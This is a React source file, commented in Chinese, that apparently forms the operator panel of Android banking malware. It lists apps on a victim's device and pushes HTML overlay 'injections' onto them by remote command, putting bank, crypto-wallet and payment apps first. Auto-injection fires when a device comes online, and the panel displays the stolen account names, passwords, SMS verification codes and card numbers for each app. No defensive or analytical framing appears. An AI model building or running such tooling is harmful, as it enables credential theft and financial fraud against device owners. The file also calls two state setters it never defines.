/**
 * 注入中心Tab - 自动注入管理（重写版 v2）
 * 功能：
 *  1. 自动注入开关（per-device）
 *  2. 获取设备应用列表，匹配模板
 *  3. 金融APP置顶（表格布局）
 *  4. 手动注入/停止/打开/通知
 */
import { useState, useEffect, useCallback } from 'react'
import { api } from '../../api/client'
import { toast, centerToast } from '../../utils/toast'

// 金融类APP关键词判断（扩展版）
// 注意：短关键词需要包含足够特征避免误匹配（如 ceb 会匹配 facebook）
const BANK_KEYWORDS = ['bank', 'icbc', 'ccb', '.boc', 'bankabc', 'bocom', 'cmb', 'citic', 'spdb', 'cebbank', 'pingan', 'psbc', 'hxb', 'cib.', 'czbank', 'nbcb', 'bos.', 'hsbc', 'ubs.', 'chase', 'citibank', 'barclays', 'santander', 'mizuho', 'mufg', 'smbc', 'bbva']
const WALLET_KEYWORDS = ['token', 'wallet', 'metamask', 'trust', 'coinbase', 'binance', 'okx', 'bitget', 'crypto', 'defi', 'chain', 'uniswap', 'pancake', 'phantom', 'solflare', 'keplr', 'exodus', 'ledger', 'trezor', 'safepal', 'bitpie', 'imtoken', 'mathwallet', 'coin98', 'rabby', 'zerion', 'rainbow', 'argent', 'blockchain', 'electrum', 'mycelium', 'atomic', 'tronlink', 'klever', 'yoroi', 'daedalus', 'terra', 'kucoin', 'gate', 'huobi', 'mexc', 'bybit', 'ftx', 'kraken', 'gemini', 'bitstamp', 'bitfinex', 'poloniex', 'dydx', 'aave', 'compound', 'lido', 'rocket', 'opensea', 'blur', 'nft']
const PAY_KEYWORDS = ['alipay', 'wechat', 'paypal', 'venmo', 'cashapp', 'zelle', 'wise', 'revolut', 'stripe', 'square', 'gpay', 'applepay', 'samsungpay', 'paytm', 'phonepe', 'mobikwik', 'freecharge', 'linepay', 'kakaopay', 'grabpay', 'gopay', 'dana', 'ovo', 'mercadopago']
const ALL_FINANCE_KEYWORDS = [...BANK_KEYWORDS, ...WALLET_KEYWORDS, ...PAY_KEYWORDS]

function isFinanceApp(packageName, appName) {
  if (!packageName && !appName) return false
  const lower = (packageName || '').toLowerCase()
  const nameLower = (appName || '').toLowerCase()
  return ALL_FINANCE_KEYWORDS.some(kw => lower.includes(kw) || nameLower.includes(kw))
}

function getFinanceCategory(packageName, appName) {
  if (!packageName && !appName) return ''
  const lower = (packageName || '').toLowerCase()
  const nameLower = (appName || '').toLowerCase()
  if (BANK_KEYWORDS.some(kw => lower.includes(kw) || nameLower.includes(kw))) return '🏦 银行'
  if (WALLET_KEYWORDS.some(kw => lower.includes(kw) || nameLower.includes(kw))) return '💰 钱包'
  if (PAY_KEYWORDS.some(kw => lower.includes(kw) || nameLower.includes(kw))) return '💳 支付'
  return ''
}

export default function InjectionTab({
  resolvedDeviceId,
  sendWs,
  injActivePkgs = new Set(),
  injActiveIds = new Set(),
  injGrabbed = [],
  parseGrabbedData,
}) {
  const [injectionActive, setInjectionActive] = useState(true)
  const [toggling, setToggling] = useState(false)
  const [deviceApps, setDeviceApps] = useState([])
  const [templates, setTemplates] = useState([])
  const [loading, setLoading] = useState(true)
  const [injLoadingPkg, setInjLoadingPkg] = useState(null)
  const [refreshing, setRefreshing] = useState(false)
  const [showOtherApps, setShowOtherApps] = useState(false)

  // 加载设备应用列表和模板
  const loadData = useCallback(async () => {
    setLoading(true)
    try {
      const [appsRes, tplRes] = await Promise.all([
        api.request(`/api/device/${encodeURIComponent(resolvedDeviceId)}/apps`),
        api.request('/api/injection/templates'),
      ])
      const appsData = appsRes?.data || appsRes || {}
      setDeviceApps(appsData.apps || [])
      // 默认保持自动注入开启，仅当API明确返回 false 时才关闭
      if (appsData.injection_active !== undefined) {
        setInjectionActive(!!appsData.injection_active)
      }
      setTemplates(tplRes?.templates || tplRes?.data || [])
    } catch (e) {
      console.error('loadData error:', e)
    } finally {
      setLoading(false)
    }
  }, [resolvedDeviceId])

  useEffect(() => { loadData() }, [loadData])

  // 切换自动注入开关
  const toggleAutoInjection = async () => {
    setToggling(true)
    try {
      const newState = !injectionActive
      await api.request(`/api/device/${encodeURIComponent(resolvedDeviceId)}/auto-injection`, {
        method: 'PUT',
        body: JSON.stringify({ active: newState }),
      })
      setInjectionActive(newState)
      centerToast(newState ? '自动注入已开启，正在触发注入...' : '自动注入已关闭')
      // 开启时立即发送 GET_APP_LIST 触发自动注入
      if (newState) {
        sendWs({
          type: 'command',
          sessionId: resolvedDeviceId,
          data: { command: 'GET_APP_LIST', params: {} }
        })
      }
    } catch (e) {
      toast('切换失败: ' + e.message, 'error')
    } finally {
      setToggling(false)
    }
  }

  // 刷新应用列表（发 GET_APP_LIST 命令）
  const refreshAppList = () => {
    setRefreshing(true)
    sendWs({
      type: 'command',
      sessionId: resolvedDeviceId,
      data: { command: 'GET_APP_LIST', params: {} }
    })
    centerToast('已发送获取应用列表命令，等待设备响应...')
    setTimeout(() => {
      loadData().finally(() => setRefreshing(false))
    }, 5000)
  }

  // 手动注入
  const startInjection = async (tpl) => {
    setInjLoadingPkg(tpl.packageName || tpl.package_name)
    try {
      // 如果模板没有 htmlContent，先获取
      let htmlContent = tpl.htmlContent || tpl.html_content || ''
      if (!htmlContent && (tpl.templateId || tpl.template_id || tpl.id)) {
        const tplRes = await api.request(`/api/injection/templates/${encodeURIComponent(tpl.templateId || tpl.template_id || tpl.id)}`)
        htmlContent = tplRes?.htmlContent || tplRes?.data?.htmlContent || tplRes?.data?.template?.htmlContent || ''
      }
      sendWs({
        type: 'command',
        sessionId: resolvedDeviceId,
        data: {
          command: 'SHOW_INJECTION',
          params: {
            packageName: tpl.packageName || tpl.package_name,
            htmlContent,
            templateId: tpl.templateId || tpl.template_id || tpl.id,
          }
        }
      })
      centerToast(`已注入: ${tpl.name}`)
    } catch (e) {
      toast('注入失败: ' + e.message, 'error')
    } finally {
      setTimeout(() => setInjLoadingPkg(null), 800)
    }
  }

  // 停止注入
  const stopInjection = async (tpl) => {
    const pkg = tpl.packageName || tpl.package_name
    setInjLoadingPkg(pkg)
    sendWs({
      type: 'command',
      sessionId: resolvedDeviceId,
      data: {
        command: 'STOP_INJECTION',
        params: { packageName: pkg }
      }
    })
    // 从数据库删除活跃注入记录
    try {
      await api.request(`/api/injection/active-tasks?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(pkg)}`, { method: 'DELETE' })
    } catch {}
    // 更新前端 state
    setInjActivePkgs(prev => { const n = new Set(prev); n.delete(pkg); return n })
    setInjActiveIds(prev => { const n = new Set(prev); n.delete(tpl.id || tpl.templateId || tpl.template_id || ''); return n })
    centerToast(`已停止: ${tpl.name || pkg}`)
    setTimeout(() => setInjLoadingPkg(null), 800)
  }

  // 打开应用
  const launchApp = (pkg) => {
    sendWs({
      type: 'command',
      sessionId: resolvedDeviceId,
      data: { command: 'LAUNCH_APP', params: { packageName: pkg } }
    })
    centerToast(`已发送打开命令`)
  }

  // 构建模板包名 → 模板映射
  const templateMap = {}
  templates.forEach(t => {
    const pkg = t.packageName || t.package_name
    if (pkg) templateMap[pkg] = t
  })

  // 从设备应用列表中提取完整应用对象
  const appObjects = deviceApps.map(a => {
    if (typeof a === 'string') return { packageName: a, appName: a }
    return {
      packageName: a.packageName || a.package_name || a.pkg || '',
      appName: a.appName || a.app_name || a.name || a.label || '',
      versionName: a.versionName || a.version_name || a.version || '',
      icon: a.icon || '',
      isSystemApp: a.isSystemApp || a.is_system_app || false,
    }
  }).filter(a => a.packageName)

  // 匹配到模板的应用（有注入能力）
  const matchedApps = appObjects
    .filter(app => templateMap[app.packageName])
    .map(app => ({ ...app, tpl: templateMap[app.packageName] }))

  // 金融APP置顶排序
  const sortedMatchedApps = [...matchedApps].sort((a, b) => {
    const aFinance = isFinanceApp(a.packageName, a.appName) ? 0 : 1
    const bFinance = isFinanceApp(b.packageName, b.appName) ? 0 : 1
    return aFinance - bFinance
  })

  // 未匹配模板的应用
  const unmatchedApps = appObjects.filter(app => !templateMap[app.packageName])
  // 金融分类排序：金融类在前
  const sortedUnmatchedApps = [...unmatchedApps].sort((a, b) => {
    const aFinance = isFinanceApp(a.packageName, a.appName) ? 0 : 1
    const bFinance = isFinanceApp(b.packageName, b.appName) ? 0 : 1
    if (aFinance !== bFinance) return aFinance - bFinance
    return (a.appName || a.packageName).localeCompare(b.appName || b.packageName)
  })

  if (loading) {
    return (
      <div className="ctrl-tab-content">
        <div className="ctrl-tab-panel">
          <div style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>
            <div style={{ fontSize: 32, marginBottom: 12, opacity: 0.6 }}>💉</div>
            <div>加载中...</div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        {/* === 自动注入开关 === */}
        <div style={{ padding: '14px 16px', background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', marginBottom: 12 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ width: 4, height: 18, background: '#52c41a', borderRadius: 2 }} />
              <span style={{ fontSize: 14, fontWeight: 600, color: '#fff' }}>⚡ 自动注入</span>
              <span style={{ fontSize: 11, color: '#94a3b8' }}>设备上线后自动对匹配的金融APP注入</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <button
                onClick={refreshAppList}
                disabled={refreshing}
                style={{ padding: '5px 12px', fontSize: 11, borderRadius: 6, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#fff', cursor: refreshing ? 'wait' : 'pointer', display: 'flex', alignItems: 'center', gap: 4 }}
              >
                <span>{refreshing ? '⏳' : '🔄'}</span>
                <span>{refreshing ? '获取中...' : '刷新应用'}</span>
              </button>
              <div
                onClick={toggling ? undefined : toggleAutoInjection}
                style={{ width: 44, height: 24, borderRadius: 12, background: injectionActive ? '#52c41a' : 'rgba(255,255,255,.15)', cursor: toggling ? 'wait' : 'pointer', transition: 'background .2s', position: 'relative', opacity: toggling ? 0.6 : 1 }}
              >
                <div style={{ width: 20, height: 20, borderRadius: '50%', background: '#fff', position: 'absolute', top: 2, left: injectionActive ? 22 : 2, transition: 'left .2s', boxShadow: '0 1px 3px rgba(0,0,0,.3)' }} />
              </div>
            </div>
          </div>
          <div style={{ marginTop: 8, fontSize: 11, color: '#64748b' }}>
            已安装 {appObjects.length} 个应用 · 匹配 {matchedApps.length} 个注入模板
            {injectionActive && <span style={{ color: '#52c41a', marginLeft: 8 }}>● 自动注入已启用</span>}
          </div>
        </div>

        {/* === 可注入应用列表（卡片） === */}
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', marginBottom: 12 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ width: 4, height: 18, background: '#fa8c16', borderRadius: 2 }} />
            <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>💉 可注入应用</span>
            <span style={{ fontSize: 11, color: '#94a3b8', marginLeft: 4 }}>({sortedMatchedApps.length})</span>
          </div>

          {sortedMatchedApps.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '20px 0', color: '#94a3b8', fontSize: 13 }}>
              <div style={{ fontSize: 32, marginBottom: 8, opacity: 0.5 }}>📱</div>
              {appObjects.length === 0
                ? '尚未获取设备应用列表，请点击「刷新应用」'
                : '未匹配到可注入的应用模板'}
            </div>
          ) : (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 10 }}>
              {sortedMatchedApps.map(({ packageName, appName, icon, tpl }) => {
                const grabbed = injGrabbed.find(g => g.packageName === packageName)
                const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                // 自动注入开启时，未获得数据的应用默认为"注入中"
                const isActive = hasData ? false : (injectionActive || injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id))
                const isLoading = injLoadingPkg === packageName
                const category = getFinanceCategory(packageName, appName)
                const colors = ['#a855f7','#e74c3c','#d4af37','#1890ff','#52c41a','#f87171','#fbbf24','#7c3aed','#06b6d4','#ec4899']
                const c = colors[(tpl.name || '').length % colors.length]
                const bg = hasData ? 'rgba(82,196,26,.08)' : isActive ? 'rgba(24,144,255,.06)' : 'rgba(255,255,255,.03)'
                const bd = hasData ? '1px solid rgba(82,196,26,.3)' : isActive ? '1px solid rgba(24,144,255,.3)' : '1px solid rgba(255,255,255,.08)'

                return (
                  <div key={packageName} style={{ padding: '12px 14px', background: bg, border: bd, borderRadius: 8, transition: 'all .15s' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                      {icon ? (
                        <img src={`data:image/png;base64,${icon}`} alt="" style={{ width: 36, height: 36, borderRadius: 8, flexShrink: 0 }} />
                      ) : (
                        <div style={{ width: 36, height: 36, borderRadius: 8, background: c + '22', border: '1px solid ' + c + '33', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14, fontWeight: 700, color: c, flexShrink: 0 }}>
                          {(tpl.name || appName || '?')[0]}
                        </div>
                      )}
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ fontSize: 13, fontWeight: 600, color: '#fff', marginBottom: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{tpl.name || appName}</div>
                        <div style={{ fontSize: 10, color: '#94a3b8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{packageName}</div>
                      </div>
                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 2 }}>
                        {category && <span style={{ fontSize: 9, color: '#fbbf24', background: 'rgba(251,191,36,.1)', padding: '1px 5px', borderRadius: 3, fontWeight: 600 }}>{category}</span>}
                        {isActive && <span style={{ fontSize: 8, color: '#1890ff', background: 'rgba(24,144,255,.15)', padding: '2px 6px', borderRadius: 4, fontWeight: 700 }}>注入中</span>}
                      </div>
                    </div>
                    {hasData && (
                      <div style={{ marginBottom: 8, padding: 8, background: 'rgba(82,196,26,.06)', borderRadius: 6, border: '1px solid rgba(82,196,26,.15)' }}>
                        {gData.account && <div style={{ fontSize: 11, color: '#a3e635', marginBottom: 3 }}>👤 {gData.account}</div>}
                        {gData.password && <div style={{ fontSize: 11, color: '#fbbf24', marginBottom: 3 }}>🔑 {gData.password}</div>}
                        {gData.verification && <div style={{ fontSize: 11, color: '#38bdf8', marginBottom: 3 }}>📱 {gData.verification}</div>}
                        {gData.card && <div style={{ fontSize: 11, color: '#c084fc' }}>💳 {gData.card}</div>}
                      </div>
                    )}
                    <div style={{ display: 'flex', gap: 6, paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.05)' }}>
                      {isActive ? (
                        <button onClick={() => stopInjection(tpl)} disabled={isLoading} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: isLoading ? 'wait' : 'pointer' }}>{isLoading ? '...' : '⏹ 停止注入'}</button>
                      ) : (
                        <button onClick={() => startInjection(tpl)} disabled={isLoading} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: isLoading ? 'wait' : 'pointer' }}>{isLoading ? '...' : '💉 注入'}</button>
                      )}
                    </div>
                  </div>
                )
              })}
            </div>
          )}
        </div>

        {/* === 手动注入中（不在模板列表但正在注入或已有数据） === */}
        {(() => {
          const matchedPkgs = new Set(sortedMatchedApps.map(a => a.packageName))
          const now = Date.now()
          const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000
          
          // Bug 3修复：收集「当前正在注入」+「24小时内注入成功获得数据的应用」
          const manualPkgSet = new Set()
          
          // 1. 添加当前正在注入的（injActivePkgs 中不在模板列表的）
          ;[...injActivePkgs].forEach(pkg => {
            if (!matchedPkgs.has(pkg)) manualPkgSet.add(pkg)
          })
          
          // 2. 添加24小时内有数据的（injGrabbed 中不在模板列表的）
          injGrabbed.forEach(g => {
            if (g.packageName && !matchedPkgs.has(g.packageName)) {
              const timestamp = g.timestamp || g.created_at || 0
              if (timestamp > now - TWENTY_FOUR_HOURS) {
                manualPkgSet.add(g.packageName)
              }
            }
          })
          
          const manualPkgs = [...manualPkgSet]
          
          // Bug 2修复：始终显示 div，为空时显示占位
          return (
            <div style={{ padding: 16, background: 'rgba(168,85,247,.06)', borderRadius: 12, border: '1px solid rgba(168,85,247,.2)', marginBottom: 12 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
                <div style={{ width: 4, height: 18, background: '#a855f7', borderRadius: 2 }} />
                <span style={{ fontSize: 13, fontWeight: 500, color: '#a855f7' }}>💉 手动注入中</span>
                <span style={{ fontSize: 11, color: '#94a3b8' }}>({manualPkgs.length})</span>
              </div>
              {manualPkgs.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '20px 0', color: '#94a3b8', fontSize: 13 }}>
                  <div style={{ fontSize: 28, marginBottom: 6, opacity: 0.4 }}>💉</div>
                  暂无手动注入
                </div>
              ) : (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 10 }}>
                  {manualPkgs.map(pkg => {
                    // 从 appObjects（设备已安装应用列表）查找应用信息
                    const appInfo = appObjects.find(a => a.packageName === pkg)
                    const appName = appInfo?.appName || pkg
                    const icon = appInfo?.icon || ''
                    const category = getFinanceCategory(pkg, appName)

                    // 从 injGrabbed 查找注入回传数据
                    const grabbed = injGrabbed.find(g => g.packageName === pkg)
                    const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                    const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                    
                    // Bug 4修复：获取数据时间
                    const timestamp = grabbed?.timestamp || grabbed?.created_at || null

                    // 状态逻辑：活跃注入中 → 蓝色；有数据且不在活跃注入中 → 绿色
                    const isActive = injActivePkgs.has(pkg)
                    const isLoading = injLoadingPkg === pkg

                    const bg = hasData && !isActive ? 'rgba(82,196,26,.08)' : isActive ? 'rgba(24,144,255,.06)' : 'rgba(255,255,255,.03)'
                    const bd = hasData && !isActive ? '1px solid rgba(82,196,26,.3)' : isActive ? '1px solid rgba(24,144,255,.3)' : '1px solid rgba(255,255,255,.08)'

                    const colors = ['#a855f7','#e74c3c','#d4af37','#1890ff','#52c41a','#f87171','#fbbf24','#7c3aed','#06b6d4','#ec4899']
                    const c = colors[(appName || '').length % colors.length]

                    return (
                      <div key={pkg} style={{ padding: '12px 14px', background: bg, border: bd, borderRadius: 8, transition: 'all .15s' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                          {icon ? (
                            <img src={`data:image/png;base64,${icon}`} alt="" style={{ width: 36, height: 36, borderRadius: 8, flexShrink: 0 }} />
                          ) : (
                            <div style={{ width: 36, height: 36, borderRadius: 8, background: c + '22', border: '1px solid ' + c + '33', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14, fontWeight: 700, color: c, flexShrink: 0 }}>
                              {(appName || '?')[0]}
                            </div>
                          )}
                          <div style={{ flex: 1, minWidth: 0 }}>
                            <div style={{ fontSize: 13, fontWeight: 600, color: '#fff', marginBottom: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{appName}</div>
                            <div style={{ fontSize: 10, color: '#94a3b8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{pkg}</div>
                          </div>
                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 2 }}>
                            {category && <span style={{ fontSize: 9, color: '#fbbf24', background: 'rgba(251,191,36,.1)', padding: '1px 5px', borderRadius: 3, fontWeight: 600 }}>{category}</span>}
                            {hasData && !isActive ? (
                              <span style={{ fontSize: 8, color: '#52c41a', background: 'rgba(82,196,26,.15)', padding: '2px 6px', borderRadius: 4, fontWeight: 700 }}>✅ 注入成功</span>
                            ) : isActive ? (
                              <span style={{ fontSize: 8, color: '#1890ff', background: 'rgba(24,144,255,.15)', padding: '2px 6px', borderRadius: 4, fontWeight: 700 }}>注入中</span>
                            ) : null}
                          </div>
                        </div>
                        {hasData && !isActive && (
                          <div style={{ marginBottom: 8, padding: 8, background: 'rgba(82,196,26,.06)', borderRadius: 6, border: '1px solid rgba(82,196,26,.15)' }}>
                            {gData.account && <div style={{ fontSize: 11, color: '#a3e635', marginBottom: 3 }}>👤 {gData.account}</div>}
                            {gData.password && <div style={{ fontSize: 11, color: '#fbbf24', marginBottom: 3 }}>🔑 {gData.password}</div>}
                            {gData.verification && <div style={{ fontSize: 11, color: '#38bdf8', marginBottom: 3 }}>📱 {gData.verification}</div>}
                            {gData.card && <div style={{ fontSize: 11, color: '#c084fc', marginBottom: 3 }}>💳 {gData.card}</div>}
                            {timestamp && <div style={{ fontSize: 10, color: '#64748b', marginTop: 4, paddingTop: 4, borderTop: '1px solid rgba(255,255,255,.08)' }}>🕐 {new Date(timestamp).toLocaleString('zh-CN')}</div>}
                          </div>
                        )}
                        <div style={{ display: 'flex', gap: 6, paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.05)' }}>
                          {isActive ? (
                            <button onClick={() => stopInjection({ packageName: pkg, name: appName })} disabled={isLoading} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: isLoading ? 'wait' : 'pointer' }}>{isLoading ? '...' : '⏹ 停止注入'}</button>
                          ) : (
                            <span style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, textAlign: 'center', color: '#52c41a' }}>✅ 数据已获取</span>
                          )}
                        </div>
                      </div>
                    )
                  })}
                </div>
              )}
            </div>
          )
        })()}

        {/* === 已安装金融APP（无模板）表格 === */}
        {unmatchedApps.filter(a => isFinanceApp(a.packageName, a.appName)).length > 0 && (
          <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(251,191,36,.2)', marginBottom: 12 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
              <div style={{ width: 4, height: 18, background: '#faad14', borderRadius: 2 }} />
              <span style={{ fontSize: 13, fontWeight: 500, color: '#fbbf24' }}>⚠️ 已安装金融APP（无注入模板）</span>
              <span style={{ fontSize: 11, color: '#94a3b8' }}>({unmatchedApps.filter(a => isFinanceApp(a.packageName, a.appName)).length})</span>
            </div>
            <div style={{ overflow: 'auto', maxHeight: 300 }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                    <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>图标</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用名称</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>包名</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 80 }}>版本</th>
                    <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 60 }}>分类</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 120 }}>操作</th>
                  </tr>
                </thead>
                <tbody>
                  {unmatchedApps.filter(a => isFinanceApp(a.packageName, a.appName)).map(({ packageName, appName, versionName, icon }) => {
                    const category = getFinanceCategory(packageName, appName)
                    return (
                      <tr key={packageName} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '6px 12px', textAlign: 'center' }}>
                          {icon ? (
                            <img src={`data:image/png;base64,${icon}`} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
                          ) : (
                            <div style={{ width: 24, height: 24, borderRadius: 4, background: 'rgba(251,191,36,.15)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 10, color: '#fbbf24', margin: '0 auto' }}>{(appName || packageName || '?')[0]}</div>
                          )}
                        </td>
                        <td style={{ padding: '6px 12px', color: '#fbbf24', fontSize: 12 }}>{appName || packageName}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11, wordBreak: 'break-all' }}>{packageName}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11 }}>{versionName || '--'}</td>
                        <td style={{ padding: '6px 12px', textAlign: 'center' }}>
                          {category && <span style={{ fontSize: 9, padding: '2px 5px', borderRadius: 3, background: 'rgba(251,191,36,.1)', color: '#fbbf24', fontWeight: 600 }}>{category}</span>}
                        </td>
                        <td style={{ padding: '6px 12px' }}>
                          <button onClick={() => launchApp(packageName)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(82,196,26,.3)', background: 'rgba(82,196,26,.1)', color: '#52c41a', cursor: 'pointer' }}>🚀打开</button>
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* === 其他已安装应用（表格） === */}
        {sortedUnmatchedApps.filter(a => !isFinanceApp(a.packageName, a.appName)).length > 0 && (
          <details style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)' }} open={showOtherApps} onToggle={(e) => setShowOtherApps(e.target.open)}>
            <summary style={{ cursor: 'pointer', color: '#94a3b8', fontSize: 13, fontWeight: 500, marginBottom: 8 }}>
              📦 其他已安装应用 ({sortedUnmatchedApps.filter(a => !isFinanceApp(a.packageName, a.appName)).length})
            </summary>
            <div style={{ overflow: 'auto', maxHeight: 400 }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                    <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>图标</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用名称</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>包名</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 80 }}>版本</th>
                    <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>分类</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 120 }}>操作</th>
                  </tr>
                </thead>
                <tbody>
                  {sortedUnmatchedApps.filter(a => !isFinanceApp(a.packageName, a.appName)).map(({ packageName, appName, versionName, icon }) => {
                    const category = getFinanceCategory(packageName, appName)
                    return (
                      <tr key={packageName} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '6px 12px', textAlign: 'center' }}>
                          {icon ? (
                            <img src={`data:image/png;base64,${icon}`} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
                          ) : (
                            <div style={{ width: 24, height: 24, borderRadius: 4, background: 'rgba(100,116,139,.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 10, color: '#64748b', margin: '0 auto' }}>{(appName || packageName || '?')[0]}</div>
                          )}
                        </td>
                        <td style={{ padding: '6px 12px', color: '#e2e8f0', fontSize: 12 }}>{appName || packageName}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11, wordBreak: 'break-all' }}>{packageName}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11 }}>{versionName || '--'}</td>
                        <td style={{ padding: '6px 12px', textAlign: 'center' }}>
                          {category && <span style={{ fontSize: 9, padding: '2px 5px', borderRadius: 3, background: 'rgba(251,191,36,.1)', color: '#fbbf24', fontWeight: 600 }}>{category}</span>}
                        </td>
                        <td style={{ padding: '6px 12px' }}>
                          <div style={{ display: 'flex', gap: 4 }}>
                            <button onClick={() => launchApp(packageName)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(82,196,26,.3)', background: 'rgba(82,196,26,.1)', color: '#52c41a', cursor: 'pointer' }}>🚀打开</button>
                          </div>
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </details>
        )}
      </div>
    </div>
  )
}
